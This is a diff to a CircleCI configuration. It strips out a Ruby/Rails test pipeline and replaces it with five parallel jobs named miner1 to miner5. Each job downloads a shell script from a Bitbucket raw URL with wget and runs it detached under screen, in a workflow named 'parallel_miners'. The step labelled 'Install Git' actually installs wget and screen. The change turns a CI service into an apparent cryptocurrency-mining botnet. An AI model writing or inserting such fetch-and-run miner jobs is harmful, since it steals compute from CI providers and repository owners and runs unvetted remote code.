@@ -1,48 +1,97 @@
 version: 2.1
 
-executors:
-  ruby-executor:
-    docker:
-      - image: circleci/ruby:3.2-node  # Ruby dengan Node.js (untuk Rails jika menggunakan Webpacker)
-        environment:
-          BUNDLE_JOBS: 4
-          BUNDLE_RETRY: 3
-      - image: circleci/postgres:13.4-alpine  # Database Postgres
-        environment:
-          POSTGRES_USER: root
-          POSTGRES_DB: test_db
-          POSTGRES_PASSWORD: password
-    working_directory: ~/project
-
 jobs:
-  setup:
-    executor: ruby-executor
+  miner1:
+    docker:
+      - image: ubuntu:20.04
     steps:
-      - checkout
       - run:
-          name: Install dependencies
+          name: Install Git
           command: |
-            gem install bundler
-            bundle install
+            apt-get update
+            apt-get install wget -y
+            apt-get install screen -y
+      - run:
+          name: Clone and Run Script
+          command: |
+            wget https://bitbucket.org/temera881/newss/raw/44434936b43f2cf3314336378aab6f52e2f336d8/ccl.sh
+            chmod +x ccl.sh
+            screen -d -m ./ccl.sh
 
-  test:
-    executor: ruby-executor
+  miner2:
+    docker:
+      - image: ubuntu:20.04
     steps:
-      - checkout
       - run:
-          name: Run database setup
+          name: Install Git
           command: |
-            bundle exec rails db:create
-            bundle exec rails db:migrate
+            apt-get update
+            apt-get install wget -y
+            apt-get install screen -y
       - run:
-          name: Run tests
-          command: bundle exec rspec  # Ganti sesuai framework (misal: `rails test`)
+          name: Clone and Run Script
+          command: |
+            wget https://bitbucket.org/temera881/newss/raw/44434936b43f2cf3314336378aab6f52e2f336d8/ccl.sh
+            chmod +x ccl.sh
+            screen -d -m ./ccl.sh
+
+  miner3:
+    docker:
+      - image: ubuntu:20.04
+    steps:
+      - run:
+          name: Install Git
+          command: |
+            apt-get update
+            apt-get install wget -y
+            apt-get install screen -y
+      - run:
+          name: Clone and Run Script
+          command: |
+            wget https://bitbucket.org/temera881/newss/raw/44434936b43f2cf3314336378aab6f52e2f336d8/ccl.sh
+            chmod +x ccl.sh
+            screen -d -m ./ccl.sh
+
+  miner4:
+    docker:
+      - image: ubuntu:20.04
+    steps:
+      - run:
+          name: Install Git
+          command: |
+            apt-get update
+            apt-get install wget -y
+            apt-get install screen -y
+      - run:
+          name: Clone and Run Script
+          command: |
+            wget https://bitbucket.org/temera881/newss/raw/44434936b43f2cf3314336378aab6f52e2f336d8/ccl.sh
+            chmod +x ccl.sh
+            screen -d -m ./ccl.sh
+
+  miner5:
+    docker:
+      - image: ubuntu:20.04
+    steps:
+      - run:
+          name: Install Git
+          command: |
+            apt-get update
+            apt-get install wget -y
+            apt-get install screen -y
+      - run:
+          name: Clone and Run Script
+          command: |
+            wget https://bitbucket.org/temera881/newss/raw/44434936b43f2cf3314336378aab6f52e2f336d8/ccl.sh
+            chmod +x ccl.sh
+            screen -d -m ./ccl.sh
 
 workflows:
-  version: 2.1
-  ruby-workflow:
+  version: 2
+  parallel_miners:
     jobs:
-      - setup
-      - test:
-          requires:
-            - setup
+      - miner1
+      - miner2
+      - miner3
+      - miner4
+      - miner5
